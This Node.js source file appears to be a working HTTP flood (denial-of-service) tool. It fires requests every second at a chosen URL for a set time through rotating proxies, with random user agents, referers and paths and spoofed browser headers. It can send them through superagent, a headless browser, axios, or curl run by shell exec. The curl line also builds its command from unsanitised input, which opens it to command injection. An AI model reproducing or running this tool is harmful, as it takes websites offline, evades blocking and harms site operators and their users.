const url = require("url");
const chalk = require("chalk");
const fs = require('fs');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

if (process.argv.length != 9) {
    console.log(chalk.red(`Wrong Usage!`));
    console.log(chalk.yellow(`Usage: node engine.js [URL] [TIME] [UA-FILE] [THREADS] [METHOD] [PROXY-FILE] [REFERER-FILE]`));
    process.exit(1);
}

const target = process.argv[2];
const time = process.argv[3];
const useragentFile = process.argv[4];
const threads = process.argv[5];
const method = process.argv[6];
const proxiesFile = process.argv[7];
const refererFile = process.argv[8];
const targetHost = url.parse(target).host;

const readFileAsync = promisify(fs.readFile);

console.log(chalk.green(`Attack started on ${target} for ${time} seconds!`));

async function BrowserEngine() {
    try {
        const [proxy, userAgent, referer] = await Promise.all([
            getRandomLine(proxiesFile),
            getRandomLine(useragentFile),
            getRandomLine(refererFile)
        ]);

        const targetPathname = target.replace(/%RAND%/g, RandomString(RandomInteger(4, 16)));
        console.log(chalk.green(`Attacking --> ${targetPathname} | Proxy --> ${proxy}`));

        switch (method.toUpperCase()) {
            case 'SUPERAGENT':
                SuperAgentRequest(targetPathname, proxy, userAgent, referer);
                break;
            case 'BROWSER':
                BrowserRequest(targetPathname, proxy, userAgent, referer);
                break;
            case 'AXIOS':
                AxiosRequest(targetPathname, method, proxy, userAgent, referer);
                break;
            default:
                NormalRequest(targetPathname, method, proxy, userAgent, referer);
        }
    } catch (error) {
        console.error(chalk.red(`Error: ${error.message}`));
    }
}

setInterval(BrowserEngine, 1000);

setTimeout(() => process.exit(0), time * 1000);

async function getRandomLine(filename) {
    const data = await readFileAsync(filename, 'utf-8');
    const lines = data.trim().split('\n');
    const randomIndex = Math.floor(Math.random() * lines.length);
    return lines[randomIndex];
}

async function SuperAgentRequest(targetString, proxyString, uaString, refererString) {
    const superagent = require('superagent');
    require('superagent-proxy')(superagent);

    try {
        await superagent
            .get(targetString)
            .proxy(`http://${proxyString}`)
            .timeout(3600 * 1000)
            .set('User-Agent', uaString)
            .set('Referer', refererString)
            .set('Cache-Control', 'no-cache')
            .set('Connection', 'Keep-Alive')
            .set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9')
            .set('Accept-Encoding', 'gzip, deflate, br')
            .set('Accept-Language', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7')
            .set('Pragma', 'no-cache')
            .set('Sec-Fetch-Dest', 'document')
            .set('Sec-Fetch-Mode', 'navigate')
            .set('Sec-Fetch-User', '?1')
            .set('Upgrade-Insecure-Requests', '1');
    } catch (error) {
        // Ignore errors
    }
}

async function BrowserRequest(targetString, proxyString, uaString, refererString) {
    const { Browser } = require('zombie');
    const browser = new Browser();

    browser.proxy = `http://${proxyString}`;
    browser.headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "Keep-Alive",
        "Referer": refererString,
        "User-Agent": uaString
    };

    browser.maxDuration = 400e3;
    browser.maxWait = 380e3;
    browser.waitDuration = '1000s';

    try {
        await browser.visit(targetString);
        await browser.wait(370e3);
        await browser.reload();
        await browser.wait(50e3);
        await browser.deleteCookies();
        await browser.window.close();
        await browser.destroy();
    } catch (error) {
        // Ignore errors
    }
}

async function AxiosRequest(targetString, methodString, proxyString, uaString, refererString) {
    const axios = require('axios');
    const config = {
        method: methodString,
        url: targetString,
        headers: {
            'User-Agent': uaString,
            'Referer': refererString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'Keep-Alive'
        },
        proxy: {
            host: proxyString.split(":")[0],
            port: proxyString.split(":")[1]
        }
    };

    try {
        await axios(config);
    } catch (error) {
        // Ignore errors
    }
}

async function NormalRequest(targetString, methodString, proxyString, uaString, refererString) {
    const request = require('request');
    const options = {
        url: targetString,
        method: methodString,
        proxy: `http://${proxyString}`,
        headers: {
            'User-Agent': uaString,
            'Referer': refererString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'Keep-Alive'
        }
    };

    try {
        await exec('curl -X ' + methodString + ' -H "User-Agent: ' + uaString + '" -H "Referer: ' + refererString + '" ' + targetString + ' --proxy ' + proxyString);
    } catch (error) {
        // Ignore errors
    }
}

function RandomInteger(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function RandomString(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
